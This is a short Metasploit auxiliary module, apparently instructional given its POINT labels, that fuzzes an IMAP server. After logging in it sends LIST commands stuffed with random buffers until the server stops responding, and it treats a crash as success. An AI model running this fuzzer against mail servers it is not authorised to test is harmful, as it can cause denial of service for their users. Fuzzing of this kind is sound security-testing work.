require 'msf/core'    # POINT A

class Metasploit4 < Msf::Auxiliary        # POINT B
    include Msf::Exploit::Remote::Imap    # POINT C
    include Msf::Auxiliary::Dos           # POINT D

    def initialize    # POINT E
        super(
            'Name'        => 'Simple IMAP Fuzzer',
            'Description' => %q{
                                An example of how to build a simple IMAP
                                fuzzer. Account IMAP credentials are
                                required in this fuzzer.
                               },
            'Author'      => [ 'ryujin' ],
            'License'     => MSF_LICENSE,
            'Version'     => '$ Revision: 1 $'
        )
    end

    def fuzz_str
        return Rex::Text.rand_text_alphanumeric(rand(1024))    # POINT F
    end

    def run    # POINT G
        srand(0)

        while (true)
            connected = connect_login()    # POINT H

            if not connected
                print_status('Host is not responding - this is G00D ;)')
                break
            end

            print_status('Generating fuzzed data...')
            fuzzed = fuzz_str()    # POINT I

            print_status(
                "Sending fuzzed data, buffer length = %d" % fuzzed.length
            )

            req  = '0002 LIST () "/'
            req += fuzzed + '" "PWNED"' + "\r\n"    # POINT J

            print_status(req)

            res = raw_send_recv(req)    # POINT K

            if !res.nil?
                print_status(res)
            else
                print_status('Server crashed, no response')
                break
            end

            disconnect()    # POINT L
        end
    end
end